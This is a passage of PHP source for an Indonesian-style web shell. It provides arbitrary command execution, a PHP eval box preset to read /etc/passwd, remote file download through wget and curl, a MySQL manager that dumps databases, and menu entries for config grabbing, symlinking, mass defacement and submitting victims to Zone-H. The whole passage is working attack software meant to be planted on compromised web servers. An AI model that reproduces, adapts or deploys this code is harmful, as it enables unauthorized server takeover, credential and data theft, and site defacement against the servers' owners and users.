		<td><a href=\"?y=$pwd&amp;edit=$full\">Edit</a> | <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">Rename</a> | <a href=\"?y=$pwd&amp;delete=$full\">Delete</a> | <a href=\"?y=$pwd&amp;dl=$full\">Download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">Gz</a>)</td></tr>";
	}
	$buff .= "</table>";
	return $buff;
}

function ukuran($file){
	if($size = @filesize($file)){
		if($size <= 1024) return $size;
		else{
			if($size <= 1024*1024) {
				$size = @round($size / 1024,2);;
				return "$size kb";
			}
			else {
				$size = @round($size / 1024 / 1024,2);
				return "$size mb";	
			}
		}
	}
	else return "???";
}

function exe($cmd){
	if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result){
			$buff .= $result;
		}
		return $buff;
	}
	elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('shell_exec')){
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

function tulis($file,$text){
	$textz = gzinflate(base64_decode($text));
	 if($filez = @fopen($file,"w"))
	 {
		 @fputs($filez,$textz);
		 @fclose($file);
	 }
}

function ambil($link,$file) { 
   if($fp = @fopen($link,"r")){
	   while(!feof($fp)) { 
   		    $cont.= @fread($fp,1024); 
   		} 
   		@fclose($fp); 
	   $fp2 = @fopen($file,"w"); 
	   @fwrite($fp2,$cont); 
	   @fclose($fp2); 
   }
}

function which($pr){
	$path = exe("which $pr");
	if(!empty($path)) { return trim($path); } else { return trim($pr); }
}

function download($cmd,$url){
	$namafile = basename($url);
	switch($cmd) {
		case 'wwget': exe(which('wget')." ".$url." -O ".$namafile);break;
		case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile);break;
		case 'wfread' : ambil($wurl,$namafile);break;
		case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break;
		case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break;
		case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break;
		case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break;
		default: break;
	}
	return $namafile;
}

function get_perms($file)
{
	if($mode=@fileperms($file)){
		$perms='';
		$perms .= ($mode & 00400) ? 'r' : '-';
		$perms .= ($mode & 00200) ? 'w' : '-';
		$perms .= ($mode & 00100) ? 'x' : '-';
		$perms .= ($mode & 00040) ? 'r' : '-';
		$perms .= ($mode & 00020) ? 'w' : '-';
		$perms .= ($mode & 00010) ? 'x' : '-';
		$perms .= ($mode & 00004) ? 'r' : '-';
		$perms .= ($mode & 00002) ? 'w' : '-';
		$perms .= ($mode & 00001) ? 'x' : '-';
		return $perms;
	}
	else return "??????????";
}

function clearspace($text){
	return str_replace(" ","_",$text);
}


?>
<html><head><link rel="SHORTCUT ICON" href="http://oi58.tinypic.com/10r33mq.jpg"><title><?=$title ?> <?=$versi ?></title>
<script type="text/javascript">
function tukar(lama,baru){
	document.getElementById(lama).style.display = 'none';
	document.getElementById(baru).style.display = 'block';
}
</script><style type="text/css">body, a:hover {cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1048.cur), progress !important;}</style>
<style type="text/css">
body { background-color:transparan;background:#000;background-image: url("<?=$background; ?>");background-position: center;    background-attachment: fixed;background-repeat: no-repeat; } 
a {text-decoration:none;
}
a:hover{
border-bottom:1px solid #00ff00; 
}
*{
	font-size:11px;
	font-family:Tahoma,Verdana,Arial;
	color:<?=$color; ?>;
}
#menu{
	background-color:transparan;
	margin:8px 2px 4px 2px;
}

#menu a{
	padding:4px 18px;
	margin:0;
	background:#222222;
	text-decoration:none;
	letter-spacing:2px;
	-moz-border-radius: 5px; -moz-box-shadow-webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
}
#menu a:hover{
	background:#191919;
	border-bottom:1px solid #333333;
	border-top:1px solid #333333;
}

.tabnet{
	margin:15px auto 0 auto;
	border: 1px solid #333333;
	color: #FFCC00; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;} 
.msupiani{ font-family:Vivaldi;font-size:50px;color: #00FF00;}
.tabnet{
	margin:15px auto 0 auto;
	border: 1px solid #333333; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.main {
	width:100%; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.gaya {
	color: $color;
}
.inputz{
	background:#111111;
	border:0;
	padding:2px;
	border-bottom:1px solid #222222;
	border-top:1px solid #222222; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
} 
.inputzbut{
	background:#111111;
	color:<?=$color; ?>;
	margin:0 4px;
	border:1px solid #444444; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;

}
.inputz:hover, .inputzbut:hover{
	border-bottom:1px solid #00ff00;
	border-top:1px solid #00ff00; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.output {
	margin:auto;
	border:1px solid <?=$color; ?>;
	width:100%;
	height:400px;
	background:#000000;
	padding:0 2px; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.cmdbox{
	width:100%; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.head_info{ 
	padding: 0 4px; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
} 
.exploded{
	font-size:30px;
	padding:0;
	color:#444444; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.exploded_tbl{
	text-align:center;
	margin:0 4px 0 0;
	padding:0 4px 0 0;
	border-right:1px solid #333333;
}
.phpinfo table{
	width:100%;
	padding:0 0 0 0; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.phpinfo td{
	background:#111111;
	color:#cccccc;
padding:6px 8px;; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.phpinfo th, th{
	background:#191919;
	border-bottom:1px solid #333333;
font-weight:normal; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.phpinfo h2, .phpinfo h2 a{
	text-align:center;
	font-size:16px;
	padding:0;
	margin:30px 0 0 0;
	background:#222222;
	padding:4px 0; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.explore{
width:100%; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.explore a {
text-decoration:none;
}
.explore td{
border-bottom:1px solid #333333;
padding:0 8px;
line-height:24px; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.explore th{
padding:3px 8px;
font-weight:normal; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.explore th:hover , .phpinfo th:hover{
border-bottom:1px solid #00ff00; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.explore tr:hover{
background:#111111; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.viewfile{
background:#EDECEB;
color:#000000;
margin:4px 2px;
padding:8px; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.sembunyi{
display:none;
padding:0;margin:0; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ;
}
.jaya{ margin:5px; text-align:right; <?=$color; ?>;}
.footer{ background:#111111; width:99%; padding:5px; margin:10px auto 5px; text-align:center; font-size:13px; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px <?=$color; ?>; -webkit-box-shadow:0px 0px 5px ; } 
.footer a{ font-size:14px; }
.footer span{ font-size:14px;}
</style></head>

<body onLoad="document.getElementById('cmd').focus();">
<!-- logout start here -->
<div id="menu"><span style='float:right;'><br>
<?="Time On Server : <b> ".date("d M Y H:i:s",time())."</b>"; ?> <br><br> &nbsp &nbsp  &nbsp &nbsp 
<a href="?<?="y=".$pwd;	?>&amp;x=kill" title='Remove Shell'>Remove</a>
 | 
<a href="?<?="y=".$pwd;	?>&amp;x=logout" title='Logout'>Logout</a> &nbsp &nbsp &nbsp <br><br>
&nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp <a href="?<?="y=".$pwd; ?>&amp;x=about"  title='About Author'>About</a>
</span></div>
<!-- logout end here -->
<div class="main">
<!-- head info start here -->
<div class="head_info">
<table><tr>
<td><table class="inputz"><tr><td><a href="" target="blank" onClick="location.reload();"><span class="F0ku5"><img src='<?=$logo; ?>' title="Security Exploded" width="150" height="150"></span></span></a></td></tr><tr><td>
<a href="http://twitter.com/GalackOff" class="twitter-follow-button" data-show-count="false">    Follow @Port22_Exploded</a>
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'http';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script></td></tr></table></td>
<td><?=$buff; ?></td>
</tr></table></div>
<!-- head info end here -->
<!-- menu start --><br>
<center><div id="menu">
<a href="?"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxQ2GRnu/TgAAAJzSURBVDjLtZLPSxtBHMXf5semZDfS7KpIaWzRShoFD5UK9h6ai5eCPfZkwYJ4kF566a30H0gF24BUqDdjBT1VCFIsNBUWEw+ha2obpDGUXGR1Z7KZ+fbQRky1vfULAzPD4/MeMw/4H7O6ugoAsG17tFwuJwFgd3f3Qq3yN0g+n7+r6/oKgEtQMDWYGHx5kc539rC4uAgA2Hy/OaGq6oplWaVcLmdxxl9YlvUEALa2tv6dYGPjXSoS6chWKpWKaZpdoVBIL5VK+0NDQ/1END02NjZ/LsHc3BwAYG1tbSIYVLOFQuGzpmldgUDAkFKqvb2917a3t23GWDqXyz0BgPX19fYEy8vLKV3XswcHBxXDMLoikYghpaRW0kajwfbK5W834/F+ANOpVGr+FLC0tHRf0/TX+/tf7J6eniuappkA6IwBtSC2bX9NJBIDRPT05OTkuTL1aKpj9Pbox1qtdmgYxlXTNG8QEV3wPgRAcV23bllWfmRkZNh13VuKpmnBvr6+O1LK2szMzNtwOBxviYUQUBQFPp+vBYCU8jCTyaSOj48vA/hw6jI+Ph5JJpOfwuFwnIjAGKsvLCw8cxxHTE4+fGwY0RgRgYi+O44zPDs7W2/rgeu6CmMMjDFwziGE+JFIJF5Vq9VMs+kdcs7BOQdjDEdHR6fGgdZGCAHOOfx+P4gIQggZjUaps9OkRqNBjDHQr1E8z8M5QLVaheM4TZ/fBxDQbDZVz/MgJYFzHlRVFURQms2GqNfr4qIm+mOx2L3u7u5hKSVCIXVPSvGmsFNUBuLxB8FA4DoAeJ63UywWswBk2x+l0+kW0P97KX80tnXfNj8B5NE5DOMV2T0AAAAASUVORK5CYII=' height="18" width="34" title='Home '></a>
<a href="?<?="y=".$pwd; ?>" title='File Explorer'>Files</a>
<a href="?<?="y=".$pwd; ?>&amp;x=upload" title='Upload File'>Uploader</a>
<a href="?<?="y=".$pwd; ?>&amp;x=sql" title='Connect To Database'>MySQL Manager</a><br><br>
<a href="?<?="y=".$pwd; ?>&amp;x=jumping" title='Jumping'>Jumper</a>
<a href="?<?="y=".$pwd; ?>&amp;x=symlink" title='Symlink'>Multi Symlinker</a>
<a href="?<?="y=".$pwd; ?>&amp;x=grabc" title='Config Grabber'>Config Grabber</a><br><br>
<a href="?<?="y=".$pwd; ?>&amp;x=mass" title='Deface To All Folder'>Mass Directory Defacer</a>
<a href="?<?="y=".$pwd; ?>&amp;x=zone" title='Submit Victim To Zone-H'>Zone-H Submiter</a>
</div></center><br>
<!-- menu end -->
<?php
@ini_set('display_errors', 0);
@ini_set('output_buffering',0);

if(isset($_GET['x']) && ($_GET['x'] == 'kill')) {
	
	echo "
<table style=width:100%; border=0 class=tabnet cellpadding=3 cellspacing=1 align=center>

	<tr>
	<td valign=top bgcolor=#151515 class=style2 style=width: 139px>
	<center><b><font size=5 style=italic color=#00ff00>Shell Killer</font></b></center></td></tr></table>
";

echo '<center><br><font style="color:<?=$color; ?>">Do You Really Want To Delete This Shell ?</b></center><br>';
?>
<center>
<div id="menu">
<a  href="?<?="y=".$pwd;?>&amp;x=killit" title='Remove Shell' >Yes, I Want</font></a> &nbsp;&nbsp;&nbsp;&nbsp; 
<a  href="<?=$_SERVER['PHP_SELF']; ?>">Cancel</a></b></center><br><br>
</div>
<?php
}
if(isset($_GET['x']) && ($_GET['x'] == 'killit')) {
$file = $_SERVER['PHP_SELF'];
if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
die('<br><br><b class="tmp"><font color="#ff0000" size="2pt"><center>Shell Has Been Killed... Take Care And Stay Safe</center></font></b><meta http-equiv="refresh" content="3; url=?".$pwd."" />');
else
echo '<font color="#fff600" size="2pt">Unlink Error !</font>';

}
/////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'php'))
{
@ini_set('output_buffering',0);
echo "
<table style=width:100%; border=0 class=tabnet cellpadding=3 cellspacing=1 align=center>

	<tr>
	<td valign=top bgcolor=#151515 class=style2 style=width: 139px>
	<center><b><font size=5 style=italic color=#00ff00>Eval</font></b></center></td></tr></table>
";
 ?>

<form action="?y=<?=$pwd; ?>&amp;x=php" method="post">
<table class="tabnet" style="width:800px;height:300px">
<tr><td>
<textarea class="output" name="cmd" id="cmd">
<?php
if(isset($_POST['submitcmd'])) {
	echo eval(magicboom($_POST['cmd']));
}
else echo "echo file_get_contents('/etc/passwd');";
?>
</textarea>
<tr><td><input style="width:800px;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /></td></tr></form>
</table>
</form>

<?php }

/////////////////////////////
///////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'sql')){
	echo "
<table style=width:100%; border=0 class=tabnet cellpadding=3 cellspacing=1 align=center>

	<tr>
	<td valign=top bgcolor=#151515 class=style2 style=width: 139px>
	<center><b><font size=5 style=italic color=#00ff00>MySQL Manager</font></b></center></td></tr></table>
";
function view_size($size) {
  if (!is_numeric($size)) { return FALSE; }
  else {
if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
else {$size = $size . " B";}
return $size;
  }
}
function mysql_dump($set) {
  $sock = $set["sock"];
  $db = $set["db"];
  $print = $set["print"];
  $nl2br = $set["nl2br"];
  $file = $set["file"];
  $add_drop = $set["add_drop"];
  $tabs = $set["tabs"];
  $onlytabs = $set["onlytabs"];
  $ret = array();
  $ret["err"] = array();
  if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
  if (empty($db)) {$db = "db";}
  if (empty($print)) {$print = 0;}
  if (empty($nl2br)) {$nl2br = 0;}
  if (empty($add_drop)) {$add_drop = TRUE;}
  if (empty($file)) {
$file = $tmp_dir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";
  }
  if (!is_array($tabs)) {$tabs = array();}
  if (empty($add_drop)) {$add_drop = TRUE;}
  if (sizeof($tabs) == 0) {
$res = mysql_query("SHOW TABLES FROM ".$db, $sock);
if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
  }
  $out = "
  # Dumped By ".$xName."
  # MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
  # Date: ".date("d.m.Y H:i:s")."
  # DB: \"".$db."\"
  #---------------------------------------------------------";
  $c = count($onlytabs);
  foreach($tabs as $tab) {
if ((in_array($tab,$onlytabs)) or (!$c)) {
  if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
  $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
  if (!$res) {$ret["err"][] = mysql_smarterror();}
  else {
$row = mysql_fetch_row($res);
$out .= $row["1"].";\n\n";
$res = mysql_query("SELECT * FROM `$tab`", $sock);
if (mysql_num_rows($res) > 0) {
  while ($row = mysql_fetch_assoc($res)) {
$keys = implode("`, `", array_keys($row));
$values = array_values($row);
foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
$values = implode("', '", $values);
$sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
$out .= $sql;
  }
}
  }
}
  }
  $out .= "#---------------------------------------------------------------------------------\n\n";
  if ($file) {
$fp = fopen($file, "w");
if (!$fp) {$ret["err"][] = 2;}
else {
  fwrite ($fp, $out);
  fclose ($fp);
}
  }
  if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
  return $out;
}
function mysql_buildwhere($array,$sep=" and",$functs=array()) {
  if (!is_array($array)) {$array = array();}
  $result = "";
  foreach($array as $k=>$v) {
$value = "";
if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
$value .= "'".addslashes($v)."'";
if (!empty($functs[$k])) {$value .= ")";}
$result .= "`".$k."` = ".$value.$sep;
  }
  $result = substr($result,0,strlen($result)-strlen($sep));
  return $result;
}
function mysql_fetch_all($query,$sock) {
  if ($sock) {$result = mysql_query($query,$sock);}
  else {$result = mysql_query($query);}
  $array = array();
  while ($row = mysql_fetch_array($result)) {$array[] = $row;}
  mysql_free_result($result);
  return $array;
}
function mysql_smarterror($sock) {
  if ($sock) { $error = mysql_error($sock); }
  else { $error = mysql_error(); }
  $error = htmlspecialchars($error);
  return $error;
}
function mysql_query_form() {
  global $submit,$sql_x,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
  if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
  if ($sql_query_result or (!$sql_confirm)) {$sql_x = $sql_goto;}
  if ((!$submit) or ($sql_x)) {
echo "<table><tr><td><form name=\"fx29sh_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=x value=sql><input type=hidden name=sql_x value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\"> <input type=submit value=\"No\"></form></td>";
if ($tbl_struct) {
  echo "<td valign=\"top\"><b>Fields:</b><br>";
  foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "+ <a href=\"#\" onclick=\"document.fx29sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
  echo "</td></tr></table>";
}
  }
  if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
}
function mysql_create_db($db,$sock="") {
  $sql = "CREATE DATABASE `".addslashes($db)."`;";
  if ($sock) {return mysql_query($sql,$sock);}
  else {return mysql_query($sql);}
}
function mysql_query_parse($query) {
  $query = trim($query);
  $arr = explode (" ",$query);
  $types = array(
"SELECT"=>array(3,1),
"SHOW"=>array(2,1),
"DELETE"=>array(1),
"DROP"=>array(1)
  );
  $result = array();
  $op = strtoupper($arr[0]);
  if (is_array($types[$op])) {
$result["propertions"] = $types[$op];
$result["query"]  = $query;
if ($types[$op] == 2) {
  foreach($arr as $k=>$v) {
if (strtoupper($v) == "LIMIT") {
  $result["limit"] = $arr[$k+1];
  $result["limit"] = explode(",",$result["limit"]);
  if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
  unset($arr[$k],$arr[$k+1]);
}
  }
}
  }
  else { return FALSE; }
}
function disp_error($msg) { echo "<div class=errmsg>$msg</div>\n"; }
function html_style() {
$style = ' <style type="text/css"> a { text-decoration:none; } a:hover { color: #00ff00; border-bottom:1px solid #00ff00; } input[type="text"], input[type="password"], select{ background:#111111; border:0; padding:2px; border:1px solid #444444; } input[type="submit"]{ background:#111111; color:#ffffff; margin:0 4px; border:1px solid #444444;} input[type="text"]:hover, input[type="submit"]:hover, input[type="password"]:hover, select:hover{ border-bottom:1px solid #00ff00;border-top:1px solid #00ff00;} .tab { width:100%; } th{ background:#191919; border-bottom:1px solid #333333; font-weight:normal; } .tub { width:100%; }  .tub th{ border-bottom:1px solid #00ff00; padding:3px;} .tub tr:hover{ background:#006400; } .tub td{ border-bottom:1px solid #333333; padding-left:3px; } #maininfo { padding:5px; margin-top:10px; margin-left:2px; margin-right:2px; background:#191919; } #maininfo a{ color:#00ff00; } textarea { background:#000000; border:1px solid #444444;} textarea:hover { border:1px solid #00ff00;} </style><center>';
return $style;
}
$auto_surl = TRUE;
foreach ($_REQUEST as $k => $v) {
  if (!isset($$k)) { $$k = $v; }
}
if ($auto_surl) {
  $include = "&";
  foreach (explode("&",getenv("QUERY_STRING")) as $v) {
$v= explode("=",$v);
$name= urldecode($v[0]);
$value= @urldecode($v[1]);
$needles = array("http://","https://","ssl://","ftp://","\\\\");
foreach ($needles as $needle) {
  if (strpos($value,$needle) === 0) {
$includestr .= urlencode($name)."=".urlencode($value)."&";
  } } } }
if (empty($surl)) { $surl = htmlspecialchars("?".@$includestr); }
if (!isset($x)) { $x = "sql"; }
  if ($x == "sql") {
  foreach (array("sort","sql_sort") as $v) {
if (!empty($_GET[$v])) { $$v = $_GET[$v]; }
if (!empty($_POST[$v])) { $$v = $_POST[$v]; }
  }
  if ($sort_save) {
if (!empty($sort)) { setcookie("sort",$sort); }
if (!empty($sql_sort)) { setcookie("sql_sort",$sql_sort); }
  }
  if (!isset($sort)) { $sort = $sort_default; }
  $sort = htmlspecialchars($sort);
  $sort[1] = strtolower($sort[1]);
  echo html_style();
echo "<div id='maininfo'>";
  if ($x == "sql") {
  $sql_surl = $surl."x=sql";
  if (!isset($sql_login)) { $sql_login = ""; }
  if (!isset($sql_passwd)) { $sql_passwd = ""; }
  if (!isset($sql_server)) { $sql_server = ""; }
  if (!isset($sql_port)) { $sql_port = ""; }
  if (!isset($sql_tbl)) { $sql_tbl = ""; }
  if (!isset($sql_x)) { $sql_x = ""; }
  if (!isset($sql_tbl_x)) { $sql_tbl_x = ""; }
  if (!isset($sql_order)) { $sql_order = ""; }
  if (!isset($sql_x)) { $sql_x = ""; }
  if (!isset($sql_getfile)) { $sql_getfile = ""; }
  if (@$sql_login)  { $sql_surl .= "&sql_login=".htmlspecialchars($sql_login); }
  if (@$sql_passwd) { $sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd); }
  if (@$sql_server) { $sql_surl .= "&sql_server=".htmlspecialchars($sql_server); }
  if (@$sql_port){ $sql_surl .= "&sql_port=".htmlspecialchars($sql_port); }
  if (@$sql_db) { $sql_surl .= "&sql_db=".htmlspecialchars($sql_db); }
  $sql_surl .= "&";
  echo "";
  if (@$sql_server) {
$sql_sock = @mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
$err = mysql_smarterror($sql_sock);
@mysql_select_db($sql_db,$sql_sock);
if (@$sql_query and $submit) {
  $sql_query_result = mysql_query($sql_query,$sql_sock);
  $sql_query_error = mysql_smarterror($sql_sock);
}
  }
  else { $sql_sock = FALSE; }
  if (!$sql_sock) {
if (!@$sql_server) { echo "<blink><b><font style= color:#ff0000>No Connection ! ! !</font></b></blink>"; }
else { disp_error("ERROR: ".$err); }
  }
  else {
#SQL Quicklaunch
$sqlquicklaunch= array();
$sqlquicklaunch[] = array("Index",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
$sqlquicklaunch[] = array("Query",$sql_surl."sql_x=query&sql_tbl=".urlencode($sql_tbl));
$sqlquicklaunch[] = array("Server status",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=serverstatus");
$sqlquicklaunch[] = array("Server variables",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=servervars");
$sqlquicklaunch[] = array("Processes",$surl."x=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_x=processes");
$sqlquicklaunch[] = array("Logout",$surl."x=sql");
echo "MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") Server: ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")<br>";
if (count($sqlquicklaunch) > 0) {
  foreach($sqlquicklaunch as $item) {
echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";
  }
  }
  }
echo "</div>";
echo "<center><table class='tab'><tr>";
  if (!$sql_sock) {
  echo  '<td>
<form name="f_sql" action="'.$surl.'x=sql" method="POST">
<input type="hidden" name="x" value="sql">
<table class="tabnet" style="padding:1px;">
<tr><th colspan="2"><b>MySQL Manager</b></th></tr>
<tr><td>Host</td><td><input type="text" name="sql_server" class="inputz" style="width:249px;background:black" value="localhost"></td></tr>
<tr><td>Username</td><td><input type="text" name="sql_login" class="inputz" value="" style="width:249px;background:black"></td></tr>
<tr><td>Password</td><td><input type="password" name="sql_passwd" class="inputz" value="" style="width:249px;background:black;"></td></tr>
<tr><td>Database</td><td><input type="text" name="sql_db" value="" class="inputz" style="width:249px;background:black"></td></tr>
<tr><td>Port</td><td><input type="text" name="sql_port"  class="inputz" value="3306" style="background:black;" size="6"> <input type="submit" class="inputzbut" style=color:$color value="Connect"></td></tr>
</table>
</form>';
  }
  else {
  echo  '<td valign="top" style="border:1px solid #333333;">
<center>
<a href="'.$sql_surl.'"><b style="color:#00ff00;">HOME</b></a>
<hr size="1" noshade>';
  $result = mysql_list_dbs($sql_sock);
  if (!$result) { echo mysql_smarterror(); }
  else {
  echo  '<form action="'.$surl.'x=sql">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<select name="sql_db" onchange="this.form.submit()" style="width:100%;">';
$c = 0;
$dbs = "";
while ($row = mysql_fetch_row($result)) {
  $dbs .= "\t\t<option value=\"".$row[0]."\"";
  if (@$sql_db == $row[0]) { $dbs .= " selected"; }
  $dbs .= ">".$row[0]."</option>\n";
  $c++;
}
echo "\t\t<option value=\"\">Databases (".$c.")</option>\n";
echo $dbs;
  }
echo '</select>
<hr size="1" noshade>
</form>
</center>';
if (isset($sql_db)) {
  $result = mysql_list_tables($sql_db);
  if (!$result) { 
$result = mysql_list_dbs($sql_sock);
$num = mysql_num_rows($result);
for( $i = 0; $i < $num; $i++ ) {
$dbname = mysql_dbname( $result, $i );
echo "<table class='tab'><td style='background:#3F3F3F;border:1px solid #202020;border-top: 1px solid #505050;border-left: 1px solid #505050;'><b>+ <a href=\"".$sql_surl."sql_db=".$dbname."\">$dbname</a></b></td></table>"; } }
  else {
echo "\t<table class='tub'><th><a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a></th></table><br>\n";
$c = 0;
while ($row = mysql_fetch_array($result)) {
  $count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]);
  $count_row = mysql_fetch_array($count);
  echo "\t<b>+ <a style='color:#00ff00;' href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\">".htmlspecialchars($row[0])."</a></b> (".$count_row[0].")</br></b>\n";
  mysql_free_result($count);
  $c++;
}
if (!$c) { echo "No tables found in database"; }
  }
}
echo '</td>';
echo '<td style="border:1px solid #333333;">';
